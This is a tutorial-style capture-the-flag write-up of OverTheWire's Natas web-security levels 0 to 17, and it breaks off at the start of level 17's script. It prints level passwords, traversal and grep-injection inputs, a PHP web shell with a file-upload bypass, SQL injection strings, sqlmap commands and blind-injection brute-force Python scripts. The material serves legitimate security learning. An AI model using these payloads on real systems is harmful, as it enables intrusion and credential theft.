# Natas
Welcome to the 3rd challenge of the WarGames series from OverTheWire.
In this CTF we are gonna learn the basics of server-side web-security.
Here is the link to view the challenge from their website : https://overthewire.org/wargames/natas/

To complete this challenge is suggested you to have at least a basic knowledge on how websites works behind the scenes (http request, headers, cookies...), basic web-development languages knowledge to understand some simple code and some common Linux commands syntax, also a familiarity with some tools for web-pentesting will help but is not strictly required.

To access every level you will only need a web browser of your choice, we will open the link and proceed; the link is http://natas0.natas.labs.overthewire.org , we will need to change the number after "natas" to match the level we want to access.

Once we have modified the link copy and paste it in the URL bar of the browser, since it is using the HTTP protocol a warning might appear telling that the connection is not secure, ignore it and view the website.

Finally to successfully view the page we will need to insert a username and password :
username : natas0 (change the number to match the level)
password : this is what we need to find to log in every level

Remember that there are multiple ways to solve most of the levels, so if one doesn't work for you or you don't like it go with another one, you can also be creative and find a method that suits with your style.
I will provide, whenever possible, multiple ways to solve the challenges, both a simple one and a more complex but comprehensive other.

Ok, everything is set, let's begin

<br/>

### Level 0
Access the website with the link : http://natas0.natas.labs.overthewire.org . 
Insert the credentials :
username : natas0
password : natas0

We see a page with written that we will find the password for the next level in this page.
If look in the page we can see there is only that sentence and the background, a good way to start to analyze a web-page and discover more info about it is to view its source code.

To view a "page source" right click with the mouse on the page and select "view page source", another tab will open in the browser showing us the code behind the page.

Viewing the code we can see there are 2 comments, highlighted in green, and thee second one contains exactly what we are looking for, the password for level 1, which is : g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
<br/>

---

### Level 0 -> 1
Access the website with the link : http://natas1.natas.labs.overthewire.org . 
Insert the credentials :
username : natas1
password : g9D9cREhslqBKtcA2uocGHPfMZVzeFK6

Once we log-in we can read that this time the right click has been blocked, meaning that probably the password is again in the home page source but we need to find another way to view it.

There are some ways around here, i will explain 2 easy and quick ones:
+ The first one is to open the developer tools in your web browser, to do it click the option menu in the top right of the browser, chose more tools, than developer tools, once you have it open you can see the page elements, extend the different forms and here we have the password as a comment like in the last level.

- Another way is to run a script blocker extension in your browser, since they deactivated the right click with JavaScript if we block the code from executing we will see the page with the right click enabled, than we can proceed as in level0.

Whether you have chosen method 1 or 2 you will be able to see the password for level2 : h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7

**Extra Mile**
If you have time or wanna practice with some pentesting tools you can even get the password by using burp suite, even tho in this case is preatty inconvenient as it is way longer.
You will need to use the proxy module to capture the initial request to the page, send it to repeater, send the request and than you will be able to see the response showing the full page source.
<br>

---

### Level 1 -> 2
Access the website with the link : http://natas2.natas.labs.overthewire.org . 
Insert the credentials :
username : natas1
password : h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7

This time we get an hint telling us that there is nothing in this page, anyway we want always to check the page source for extra info.

When we see the page source we can notice that there is a call for an image, if we click on the link we see a very small white square.... not usefull.
Looking again in the source code we see that the image is in a directory called "files", maybe we can go inside of it and see if there are any usefull ones, to do it add "/files" in the URL.

Here near the image file there is a text file called "users.txt", we can open it by clicking on it and we can see a list of usernames and passwords, and luckly enough there is also the oune for natas3 : G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
<br/>

---

### Level 2 -> 3
Access the website with the link : http://natas3.natas.labs.overthewire.org . 
Insert the credentials :
username : natas3
password : G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q

Let's view again the page source, but this time we see a comment in the code saying that there are no more information leaks, this means that we have to find a new way to discover the password.

The sentence also tells us another curious thing, that even Google wont be able to find it.... ; 
So a little bit of theory : when you create a website and you post it online Google will crwal and index all the pages of your website, so the people will be able to search for each and the content inside of it. But what if you don't want a search engine to index one of more pages? You create a file called "robots.txt" and all the pages inside this text files will be automatically ignored and not indexed.

Knowing this we can change the url by adding /robots.txt and see if that's the case.
Looks like there is a page that has been hidden, with the name of "/s3cr3t/", let's visit it by adding that to the end of the URL (remember to remove /robots.txt firs); we can see a page source and a call for a document which name is "users.txt", we can double click on it to open the link.

And a new page open with the password for natas4 : tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
<br/>

---

### Level 3 -> 4
Access the website with the link : http://natas4.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas4
password : tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm

This time, as we can read when we open the website, in order to view the password we need to appear as if we connected to this site coming from http://natas5.natas.labs.overthewire.org/ .

When you visit a website you automatically send a request with many HTTP headers that serve the purpose of giving you the content you want for the platform you are using, in our case the header we are interested in is called *Referer*, it is used to tell a website from which website we are coming from (if any).

In this case we want to manipulate that value to make it looks like we are coming from the level5 website.

Again there are different ways, this time i will explain the Burp Suite one and later give an hint for an easier method.

So open Burp Suite, go in the proxy section and start up the built in browser, visit  again the current level website and log in;
Now back into the proxy section, enable the proxy by clicking on "intercept" and make it turn 4575DB, go back to the browser and reload the page.
Doing this you will receive the HTTP request, right click and tap on "send to repeater", here we will add the header to forge a new request making us looks like we are coming from natas5.

In the raw code, after the user agent part, add a new line with this :
```
Referer: http://natas5.natas.labs.overthewire.org/
```

Now the request is ready, click on "send" and we will receive the response.

The response is like the page source we have analyzed before, scroll down ad you will find the password : Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

**Easier Method**
After completing the challenge i have noticed that some browsers offer an extension to change the referrer, downloading it will proably make the whole process faster as, once in the website page you can open your extension and type in the referrer of your choice.
Remember to vet the extensions before installing them ;).
<br/>

---

### Level 4 -> 5
Access the website with the link : http://natas5.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas5
password : Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

When the sites open we get the message "Access disallowed. You are not logged in"...

In the website where you can login there are the "session cookies" these are used, as we can imagine, to sign the session, and they will change value once you log in and establish your own session in the site.

Let's check if it is the case, we can open the "developer tools" from the option menu of the browser, than on the top navigate to "Application" and now on the left panel choose cookies, you should see the URL of the natas page, click on it.

Now we can see which cookies are active here and their value, here we can see a cookie called "loggedin" with the value of 0.

Normally cookies, expecially session ones, will have a very long and complicated value to avoid the risk of session hijacking, here since the value is only "0" and we got the error message before, we can guess that "0" is for session closed and "1" for session established.

With this knowledge we can now change the cookie's value, tap on the "0", right click and chose "edit value", make it "1".

At this poin we need to refresh the webpage, re-insert our credential of the level and we will have the password for natas6 displayed : fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
br/>

---

### Level 5 -> 6
Access the website with the link : http://natas6.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas6
password : fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

This time we can see there is a box where we have to submit a secret code, there is also an option to check the source code, let's view it.

The script is preatty simple, it will check if the secret we submit is the same as the one it has in memory, if so it will print the password for natas7.

The problem is that we don't know the secret code...yet. In fact if we look again at the code we can see that it includes a file, we can imagine that in that file is stored the secret code where the script will look for the match.
We can try to see if we can reach it with our browser, add at the end of the URL "/includes/secret.inc", luckly enought we get a page with the value of secret : FOEIUWGHFEEUHOFUOIU .

At this point we can copy and submit it going back into the main page, and like magic we get the password for the next level : jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
br/>

---

### Natas 7
Access the website with the link : http://natas7.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas7
password : jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr 

he home page seems showing nothing much, let's view the page sourve and we can notice a comment wit an hint  that says our password for level 8 is located in /etc/natas_webpass/natas8 .

In order to reach that directory we can use a tecnique called directory traversal, in a few word it consists in evading the normal path to reach a file, allowing us to see other files and directories that we should not normally see.

This is usually achieved by exploiting a php function, usually a legitimate one that calls for a file, we can than manipulate it to get another file (the one hidden that we want). 

To do it i have noticed that when we click in the home page to one of the links (home or about), the URL changes and it add a php funcion calling for the files that contains the home or about page. 

Knowing this i edited the url :

1. Remove the last word (about or home depending on which link you have clicked on)
2. We want to escape the current directory and go back to the root one, so we can than move to the one containing the password, so i crafted this part that we want to add after the `=` simbol :
`../../../../etc/natas_webpass/natas8`

3. Now press `ENTER` and the password will be displayed on your screen : a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
<br/>

---

### Natas 8
Access the website with the link : http://natas8.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas8
password : a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB 

This time we have again a form where we have to insert a secret code, let's click on the "view source code" link to understeand what is going on behind the scene,

The script will encode a secret and if it finds a match it will provide us with the pasword we are looking for.
We can also notice in the first line that there is the value of the encoded secret already written in the code, what we have to do is to decode it, find the original secret and submit it.

The secret, as we can see in the script, has been encoded multiple times, so in order to decode it we have to go trough some passages in reverse order from the script :
(You can find plenty of tools online for this actions, chose the one you prefer, you can even create your own script to do all the job if you like)

Encoded secret = 3d3d516343746d4d6d6c315669563362
1. Decode bin2hex
	we will get this : `==QcCtmMml1ViV3b`

2. Reverse it
	and we get this : `b3ViV1lmMmtCcQ==`

3. Decode the base64 string
	And we finally get the secret: oubWYf2kBq

Now insert that code in the form, press submit and you will see the password for natas9 : Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

**The Hard Way**
We have jsut seen how to decode the initial encoded secred by using multiple different tools online, BUT there is another way to do it, create your own script to automate the process.
Since the first script was made in PHP i have created another PHP script that does the decoding, i have written it line per line so everyone will be able to view all the steps that the script does, like the ones we did before.
I think seeing this will might help you getting started viewing some programming languages and how they work, if you already know the foundamentals and wanna push trough i suggest you to create your own script and then maybe optimize it.
```php
<?php


$hex = "3d3d516343746d4d6d6c315669563362";

$bin = hex2bin($hex);

$reverse = strrev($bin);

$secret = base64_decode($reverse);

print ($secret);


?>
```

Than save the file as .php and to get the result run : 
```zsh
php script.php
```
<br/>

---

### Natas 9
Access the website with the link : http://natas9.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas9
password : Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

There is again a form, where we have to insert a word/string to search, checking the code we can see that it will search for that value with `grep` inside a document called "dictionary.txt".

Once more there are several ways to find the solution.
One is to escape the function abusing the grep binary and knowing how it works, let's break it down :

In the sourcecode we see this part
```zsh
grep -i $key dictionary.txt
```
What is does is using the grep binary to search into the txt file the word we have submitted, BUT what if i tell you that we can change how it works just by submitting a couble of right words and simbols?

Now clearly looking at the code we can do nothing about the `grep -i` part, but what if, at the place of the variable, we were able to tell grep to print something else in another document in another directory, maybe the one that we know is holding the password for the next level.

We can achieve this by submitting
```zsh
"" /etc/natas_webpass/natas10 
```
Doing this we are telling `grep` to give us all the content of either the natas10 file and the dictionary file.
The first line displayed will show us the password : D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

Note: there are other combinations of words-caracthers you can use, like `;` and than `cat` command, using one or another will vary slighty the output but you should be able to see the password strings anyway.
<br/>

---

### Natas 10
Access the website with the link : http://natas10.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas10
password : D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

We can see again a form where we can search for words, but this time it tells us that a filter for certain characters has been added for security reasons.

Viewing the source code we can check which characters are forbidden so we can better understeand how to move
```javascript
if(preg_match('/[;|&]/',$key)) {  
        print "Input contains an illegal character!";
```

If you have followed my previous task vrite up you will notice that the same strategy used before will work here as well without any differences, even though there is a filter this time, this is because the double quote `""` i decided to use even before will kinda close the filtering function, allowing again the other special characters.

So, as we know what is the location for the level 11 passowrd we can write the path there, so the `grep` function will display us the file content
```
"" /etc/natas_webpass/natas11
```

The first line displayed will show us the password:
<br/>

---

### Natas 11
Access the website with the link : http://natas11.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas11
password : 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg

In this level we can see another form, where we can insert a color hex value to change the background, there is also a sentence that informs us that cookies are protected with XOR encryption.

Let's begin by reading the source code behind this functions
```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

```

This time the code is a bit more complex so let's break it down to understeand what exactly is happening and how we can retrive our password.

1. At first an array containing the default "_showpassword_" and "_bgcolor_" properties is declared.
2. Than we can se 3 functions : 
	- The first one is taking care of the XOR encryption
	- The second one will work to load the data
	- And the last one will save the data
3. Finally there is a check and if the `bgcolor` key exist and matchs the characters listed, it will update the `$data` with the value from the `$_REQUEST` and at the end it calls tht savadata function with `$data` to save it in an encoded cookie.

Without going too much into details and making this long, we can see that in the first declared array the showpassword value is set to "no", as we can imagine we want a work to change that value somehow into a "yes".

More specifically we want to create a new valid cookie, which once is decoded will contain the same array as the one we have analyzed but with the "yes" value.

Now we firstly have to understeand how the XOR encryption works:
Aftere a brief research online i understood that this encryption is a type of cipher called additive, meaning that operates on this on this principles:
```
A ⊕ 0 = A
A ⊕ A = 0
A ⊕ B = B ⊕ A
(A ⊕ B) ⊕ C = A ⊕ (B ⊕ C)
(B ⊕ A) ⊕ A = B ⊕ 0 = B
```
Where `⊕` is the *exclusive disjunction* operation... basically as we can see a kind of subtraction.
So to decrypt the ouput we can symply reapply the XOR function with the key.

In our scenario we need the encrypted text, the key and with this 2 using the XOR function we can view the original plain text. But there is one problem the key value is censored.

Luckly enough applying the XOR method we can retreive the key knowing `ciphertext XOR plaintext = key` .

We can start the process by viewing the cookie value in our browser, to do it open the dev tools, go under storage and than cookies, here you can see the value:
MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY3D --> the final `%3D` is the encoded value of `=`. --> MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=
So we now know that this strig contains the `showpassword="no"` and we want a yes.

Now we can create a script to make a cookie that is not XOR encrypted so we can than use this and the encrypted ones to get the key.
```php
<?php

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

echo base64_encode(json_encode($defaultdata));

?>
```
You can execute this on a php sandbox website online and you will get this value: eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=

Now is time to get out key
For this step you can either craft another script or go on a website like https://cyberchef.org/ , here you want to chose the receipe "from base 64" and than "XOR", as key put the non-encrypted cookie and set the type as base 64; now input the encrypted cookie and you will get the key `KNHL`

We are almost there, let's now craft the new cookie
Still in cyberchef, now chose first the XOR receipe and than "to base 64", here we want to put the key and set it  as UTF-8 type with the standart scheme; in the input put wat we want to change so: `{"showpassword":"yes","bgcolor":"#ffffff"}`.

In my case this is the new cookie i got: MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz

Now that we have our new cookie go back into your browser in the natas11 page, open dev tools, edit the previous cookie with the new one and press enter, than in the for click the set color botton and the password for natas12 will be displayed on screen: 
<br/>

---

### Natas 12
Access the website with the link : http://natas12.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas12
password : YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

When opening the website we can notice that there is a form where we can chose and than upload a file.
We can click on "View source code" to better understeand what is happening behind this form.

There is a php script where we can see that only files under 1000 are accepted, also when we upload a file the name of the upload will be changed  with a random string that ends with `.jpg`.

What we want to do is to initiate a web shell so we can than execute commands and retreive our password for level 13.
One way is to create a simple php web shell like this one
```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```
Than we can save it as web_shell.php on our device, but remember that the name is not important rn as it will be changed anyway by the script.

We can then select our file, but we want to inject ourselves in the middle of the request and change the name that has been given, we want to remove the `.jpg` and rename it as `.php`.
There are 2 main ways to do it:
1. Intercept the request when choosing the file with burp suite, send it to repeater and before sending the request to the server, find and rename the extension.
2. Use dev tools on any browsers:
	- Choose the file
	- Open dev tools and under the elements tab locate the `.jpg` extension,
	- Click on it and choose "edit as html"
	- Change to `.php`

Ok now we are ready to click upload and we can see that our file has been uploaded with the right extension, click on it.

Now we get an index notice, is fine just add `?e=ls` at the end of the url and it will show us some files that has been uploaded.
This means that we succesfully managed to execute code on the server, now is time go haunt for the password.

We already know from the previous levels that the passwords are all located in the same directory called: natas_webpass
So let's edit the URL again, remove the code that we added before and replace it with this one 
```
?e=cat%20/etc/natas_webpass/natas13
```

Press `ENTER` and the password will be displayed on the screen : lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
<br/>

---

### Natas 13
Access the website with the link : http://natas13.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas13
password : lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9

Once again we have a web-form where we can submit a file, this time it tells us that it is only accepting JPEG files for security reasons.
The file size also has to be of max 1KB.
The script function similar to the one in the previous level, renaming our upload with a random string and changing its extension to `.jpg` . 

Let's start by creating a php script that will give us a shell, as on level 12
```
nano shell.php
```
paste inside this and save:
```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```

Let's verify if it actually filter for images, we can chose our shell file created in the previous level and implement the same method...ok this time is actually different, in fact we get the message "File is not an image", we need to find a way around.

At this point i firstly went for the easiest try, uploading the shell file with a double extension like this: `shell.php.jpg` but the site understood that the file was still not an image.

Now i know that there is for sure:
- File size filtering;
- File extension filtering;
- Possibly mime type or magic number filtering, let's test this one.

I want to check if also the magic number filtering has been implemented, to do so we have to edit the first 4 couple of digits in the file hex view, those are the one used to identify a certain file type, so i want to fake it is a jpeg file ad use it's magic number.

Let's use a binary to edit the file
```bash
hexedit shell.php
```
Substitute the first block with this one: FF-D8-FF-E0 and that press `CRTL + X` to save and exit.

Now i try to upload the file and finally it accepts it, but there is a problem, the shell doesn't work; looking at the output on the screen i realized that, because we edited the magic number, we also have to modify the original script in the shell, to preserve our php.
All we have to do is add jpeg at front
```php
jpeg<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```
Now we can go back in *hexedit*, edit the first 4 bytes and upload the file.

Remember that because the website filter script is also changing our file extension we have to open devtools or use burpsuite to change it back to php as we did on level 12, than navigate to the uploaded file.

Now we are ready to get our treasure, go in the URL and add this at the end, to navigate and open the file containing the natas 14 password
```
?e=cat%20/etc/natas_webpass/natas14
```

And finally we got the password for level 14 : qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
<br/>

---

### Natas 14
Access the website with the link : http://natas14.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas14
password : qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP

After logging in we notice that there is another login where we have to insert some username and password.

There is just one problem: we don't know neither the username nor the password to use.

Let's begin by viewing the source code, from what i can see the script seems checking for the credentials into a mysql database, if it finds a match for both the username and the password we will be given the password for natas15.

I have a feeling that we need to do some SQL Injection.
Well this topic is pretty long, and usually involves a lot of testing on the website, checking which errors we receive (you can use burp suite repeater for this), and than adjusting our SQL queries every time we get a new piece of information.
If you are interested in this type of attack i suggest you to do further researches to better comprehend how it works and what you can do.

Taking a different approach at the problem, in this scenario we have to perform an authentication bypass, we are not actually interested in retrieving or manipulating the database (actually might yes if is possible to inject credentials, but not the fastest way and not always possible).

The easiest way is to use common pre-made statements that will cause the query to return True both for the username and the password, in this way it will seems like we had a match in the database while we actually did not.

So, after a couple of tests inserting in both the field `'` `or1=1` `'or1=1--` i came to this one `" or1=1--`, let's break it down: the double quote is used to insert a command, the OR expression is the one that will make it return True, and finally the double dash `--` is used to comment out everything after it.

Insert that in both the field, press Login, and we have the password for natas15 : TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
<br/>

---

### Natas 15
Access the website with the link : http://natas15.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas15
password : TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB

Continuing with the exploitation of web forms, this time we have to submit an username and than check if that is present inside the database.

Looking at the source code we can notice that some lines have been commented out, is seems they wanted to create a table called users, and put inside usernames and their passwords.

So know we know that there is a table containing in one column the username and in the other the password, we also see that the maximum length of each is 64 characters.
Another good thing to notice is that we are given an error when inserting the username, so because the username and the password are in the same table we can check either if the username and a password are right.

A little piece of theory:
Because the only result we get is boolean value, either True or False, this type of SQL Injection is called Blind.

At this point there are no other hints to proceed, so i tried to insert "natas16" as username, as it is the next level of the challenge and i get the message "the user exists".
Cool now we know that very likely the password in that table is also the password for the next level, but we have to find a way to "guess" it.

Now is time to work our way to the password, i have checked the other levels and all passwords are 32 characters long, beside this we do not know any other information regarding it, as they all seems to be composed by random numbers and letters.
The idea of "guessing" it is not really possible in this scenario, but we can try to brute force it.

Now the road splits in 2, we can decide to handle ourselves the queries to the database to check for every letter correspondence, create a script in a language like python and wait for the result; or we can use a tool called *sqlmap*, it was purposely made for this type of jobs an will make the job easier.

I will start with the tool, in order to retrieve the password we have to create the command containing all the info and handling right the situation, after some tests i ended up with this one:
```bash
sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?" --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB --string="This user exists" --data "username=natas16" --level=5 --risk=3 -D natas15 -T users -C username,password --dump --dbs
```
Let's break it down:
The `-u` switch is used to specify the URL we want to attack;
Than we use `--auth` switch to specify the type of HTTP authentication used to log into the level, and in the next one we provide the username and the password.
Than with `--string` we tell it to look for the message "this user exists", by doing so we know that each "injection" has successfully checked the presence of the item/value in the database;
With `--data` we specify the username that got us the success message before;
The next two switches `--level` and `--risk` are used to customize the detection phase, i put the highest level on both as is not a problem in this scenario;
The `-D` switch is used to specify the database and `-T` to set the table, finally `-C` specify which columns we are interested in.
We end the command with `--dump` meaning we want the items in the table and columns we have specified.
`--dbms=mysql` : is used to specify the database type, as we know it by looking at source code at the beginning, specifying this will make the script much much faster.
  
Now run it and wait, it should not take more than a minute with the last switch set right, if you went for your own command syntax than be aware that it can take a lots of time as it is probably doing more testing.

The binary finally show us the table, there are actually more users, for a total of four, the last one is the one of interest and in the second column we also have it's password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

**Road 2**
This way is a bit more complex and require the knowledge of a scripting language like Python as we will need to create a script that will automate the process to get the password.
First of all we have to understand how is the script checking the database and the results we get, so we can than test it and try to write the script.

When we are submitting an username this is the SQL query being sent, in this scenario i put the name "natas16":
```sql
SELECT * from users where username="" LIKE BINARY "%natas16%"
```
This query, with "natas16" will return True and hence we get the message "This user exists".

Knowing this we can create a query that will check if a word is part of the password, this is particularly useful to speed up the process, otherwise we will have to try all the letters in the alphabet for a password of 32 characters, not super convenient.

They query looks like this:
```sql
SELECT * from users where username="natas16" and password LIKE BINARY "%a%"
```
This will return again a boolean value, causing the message "This user exist" or "This user doesn't exist." if the word is not part of the password.

We can verify that this is working injecting the code in the URL like this:
```php
http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22+and+password+LIKE+BINARY+%22%a%&debug
```
And we are lucky we know know the word "a" exists.

Now is time to create a script that will automate this process, listing all the letters and numbers that are in the password, and than re ordering them to form the right combination.
```python
#!/bin/python  
  
# import the libraries that we need  
import requests  
from requests.auth import HTTPBasicAuth  
  
# Save the login information in variables  
username = "natas15"  
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"  
url = "http://natas15.natas.labs.overthewire.org/index.php?debug"  
  
# Variables that will contain the possible chars and the final password  
chars_in_pswd = ''  
pswd = ''  
  
# login to natas15 challenge  
authentication = HTTPBasicAuth(username, password)  
print(requests.get(url, auth=authentication))  
  
# Saving all the possible chars in a variable for later use  
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  
  
# Loop to check the presence of each char  
for char in chars:  
    payload = {'username': 'natas16" and password LIKE BINARY "%' + char + '%" #'}  
    req = requests.post(url, auth=authentication, data=payload)  
    if 'user exists' in req.text:  
        chars_in_pswd = chars_in_pswd + char  
  
# Print the chars that are contained in the final password  
print(chars_in_pswd)  
  
# Execute the brute-force attack  
for count in range(0,32):  
    for char in chars_in_pswd:  
        brute_force_payload = {'username': 'natas16" and password LIKE BINARY "' + pswd + char + '%" #'}  
        request = requests.post(url, auth=authentication, data=brute_force_payload)  
        if 'user exists' in request.text:  
            pswd = pswd + char  
		  print(pswd)
            break
            
# Print the final password  
print("The password for the next level of natas is: ", pswd)

```

It should take up to 5 minutes, once completed here is the password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

I encourage you to practice and create your own best version of this ;)
<br/>

---

### Natas 16
Access the website with the link : http://natas16.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas16
password : TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

Another web form to exploit yaii, looking at the source code we can notice that this time there is a filter that will block some chars: 
```
/[;|&`\'"]/
```

One interesting new is the absence of a mySQL database, the word is checked using the `grep` Linux command inside a text file called "dictionary.txt".
This is the full command
```bash
grep -i \"$key\" dictionary.txt
```

As we did on the first levels, we want to break this grep command to make it display the password, which is contained in /etc/natas_webpass/natas17 .

Luckily for us they didn't filter out all the special chars, in fact we can still use `$()` to apply *command substitution*, rather than using `''`.
As from the GNU documentation: "Command substitution allows the output of a command to replace the command itself."

This mean that we can execute the command we want inside the parenthesis, get that output and pass it to the external `grep`.
What we aim to do is checking if some chars are in the password, similar to the previous level, but this time we do not have an printed output, we have another sign: if we check for a letter or a word that is in the dictionary file we will get those words this means that that letter is not in the password; vice versa if we get no output this mean that the word is in the password.

We can create a command like this 
```bash
$(grep a /etc/natas_webpass/natas17)cutest
```
I choose the word "cutest" because is one of the word i know are in the dictionary, this way i can test if the concept is working; you can chose the one you prefer.
Now we need to reiterate this command, if we get a response and some words appear on the screen we move to the next letter, until we get "no result", in this situation the char is part of the final password.

Again we have to repeat this for all the letters, of the alphabet both upper and lower case + the numbers from 0 to 9.
Once all this is done we have a list of all the chars part of the password, than we need to put find the right order.

As in the last level i have created a python script to automate all this long work
```python

#!/bin/python

# import the libraries that we need
import requests
from requests.auth import HTTPBasicAuth

# Save the login information in variables
username = "natas16"
password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
url = "http://natas16.natas.labs.overthewire.org/?"

req_object = {'needle': ''}

# Variables that will contain the possible chars and the final password
chars_in_pswd = ''
pswd = ''


# login to natas16 challenge
authentication = HTTPBasicAuth(username, password)
print(requests.get(url, auth=authentication))

# Saving all the possible chars in a variable for later use
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# Loop to check the presence of each char
for char in chars:
    payload = "$(grep " + char +" /etc/natas_webpass/natas17)cutest"
    req_object['needle'] = payload
    req = requests.post(url, auth=authentication, data=req_object)
    if 'cutest' not in req.text:
        chars_in_pswd = chars_in_pswd + char

# Print the chars that are contained in the final password
print("the password contains this chars: ", chars_in_pswd)

# Execute the brute-force attack
for count in range(0, 32):
    for char in chars_in_pswd:
        brute_force_payload = "$(grep ^" + pswd + char + " /etc/natas_webpass/natas17)cutest"
        req_object['needle'] = brute_force_payload
        request = requests.post(url, auth=authentication, data=req_object)
        if "cutest" not in request.text:
            pswd  += char
            print(pswd)
            break

# Print the final password
print("The password for the next level of natas is: ", pswd)


```

This time the script will take more time so be patient, you can go to take a coffie.

After a while here we have it : XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
<br/>

---

### Natas 17
Access the website with the link : http://natas17.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas17
password : XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd

We are presented again a web form where we have to insert an username, checking the code it  is very similar to the one of level 15, still searching for a match in a mySQL database.
There is one difference tho, the response in case we write a correct or wrong username is commented out, this means that we get no written feedback whether we are inserting the right data or not.

On the bright side, there is another option available, using the "time" --> "response time" of our requests as an answer, based on the value that it will give us back we can simulate the True/False response we had on level 15.

We can use a query like this one to test if it works, and then test again with a wrong username
```sql
SELECT * from users where username="natas18" and sleep(5)
```

To try it write this in the username field:
```
natas18" and sleep(5) #
```
We can notice that the page took 5 seconds to load as we expected.
And if we try with other names like "natas19" the page will load instantly.

Now we know that the idea of using the response time as a clue is right.

As in level 15 we have 2 ways to proceed:
A little thing: if your connection is slow or congested it will make the results not correct and you might need to run both of the methods multiple times. If you still get bad results try to increase the sleep time to avoid false positives and do not do any other internet related things in the meantime.

**Method 1**
Use *sqlmap*
```bash
sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?" --time-sec=1 --auth-type=Basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd  --data "username=natas18" --level=5 --risk=3 -D natas17 -T users -C username,password --dump --dbms=mysql
```
The only difference between this syntax and the one of level 15 is the `--time-sec=1` switch.
If you are seeing this for the first time i suggest you to check my explanation of this entire command on level 15 :)

This will get the job done in about 15 minutes.
And here it is: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq

**Method 2**
You already know it, time for Python!
This time will be faster as we can save most of the code from the previous level and arrange some little things.
The query that we want to test is:
```sql
SELECT * from users where username="natas18" and password like binary '%a%' and sleep(5) #
```

```
natas18" and password like binary '%d%' and sleep(5) #
```

```python
#!/bin/python  
  
# import the libraries that we need  
